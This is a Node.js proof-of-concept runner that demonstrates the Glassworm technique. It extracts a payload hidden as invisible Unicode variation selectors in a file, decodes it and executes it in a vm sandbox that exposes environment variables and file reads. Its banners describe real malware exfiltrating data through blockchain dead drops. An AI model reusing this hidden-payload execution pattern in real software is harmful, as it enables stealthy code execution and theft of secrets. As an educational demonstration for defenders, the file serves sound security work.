// ⚠️ EDUCATIONAL POC — DO NOT USE MALICIOUSLY
// Reads a file containing an invisible Unicode payload, decodes it, and executes it.
// Safety: runs in vm sandbox with restricted access + prints clear banners.

'use strict';

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { decodeToString } = require('./glassworm-decoder');

const BANNER_START = `
╔══════════════════════════════════════════════════════════╗
║  ⚠️  GLASSWORM POC — ATTACK SIMULATION STARTING         ║
║  This demonstrates what hidden malware can do.           ║
║  NO data is exfiltrated. This is READ-ONLY.              ║
╚══════════════════════════════════════════════════════════╝
`;

const BANNER_END = `
╔══════════════════════════════════════════════════════════╗
║  ⚠️  SIMULATION COMPLETE                                 ║
║  Real Glassworm malware would exfiltrate all data above  ║
║  to a C2 server via Solana blockchain dead drops.         ║
╚══════════════════════════════════════════════════════════╝
`;

/**
 * Extract invisible Unicode characters from file content.
 * Looks for template literal or string containing variation selectors.
 */
function extractInvisiblePayload(fileContent) {
  let payload = '';
  for (const char of fileContent) {
    const cp = char.codePointAt(0);
    if ((cp >= 0xFE00 && cp <= 0xFE0F) || (cp >= 0xE0100 && cp <= 0xE01EF)) {
      payload += char;
    }
  }
  return payload;
}

/**
 * Run a file containing an invisible Glassworm payload.
 */
function run(filePath) {
  const absPath = path.resolve(filePath);
  if (!fs.existsSync(absPath)) {
    console.error(`Error: File not found: ${absPath}`);
    process.exit(1);
  }

  const content = fs.readFileSync(absPath, 'utf-8');
  const invisible = extractInvisiblePayload(content);

  if (invisible.length === 0) {
    console.error('No invisible Unicode payload found in file.');
    process.exit(1);
  }

  const decoded = decodeToString(invisible);

  console.log(BANNER_START);
  console.log(`Decoded ${invisible.length} invisible chars → ${Buffer.from(decoded).length} bytes`);
  console.log('--- Payload source (first 200 chars) ---');
  console.log(decoded.slice(0, 200));
  console.log('--- Executing payload ---\n');

  // Execute in vm sandbox with limited globals (no child_process, no net, no file write)
  const sandbox = {
    console,
    process: {
      platform: process.platform,
      version: process.version,
      cwd: process.cwd,
      env: process.env, // read-only exposure for demo (shows what attacker can access)
    },
    require: (mod) => {
      // Allowlist: only safe read-only modules for demo
      const allowed = { fs: { readFileSync: fs.readFileSync }, os: require('os'), path };
      if (allowed[mod]) return allowed[mod];
      throw new Error(`[SANDBOX] require('${mod}') blocked — only fs.readFileSync, os, path allowed`);
    },
    Buffer,
  };
  try {
    const ctx = vm.createContext(sandbox);
    vm.runInContext(decoded, ctx, { timeout: 5000, filename: 'glassworm-payload.js' });
  } catch (err) {
    console.error('Payload execution error:', err.message);
  }

  console.log(BANNER_END);
}

// CLI: node glassworm-runner.js <file>
if (require.main === module) {
  const target = process.argv[2];
  if (!target) {
    console.error('Usage: node glassworm-runner.js <file-with-invisible-payload>');
    process.exit(1);
  }
  run(target);
}

module.exports = { run, extractInvisiblePayload };
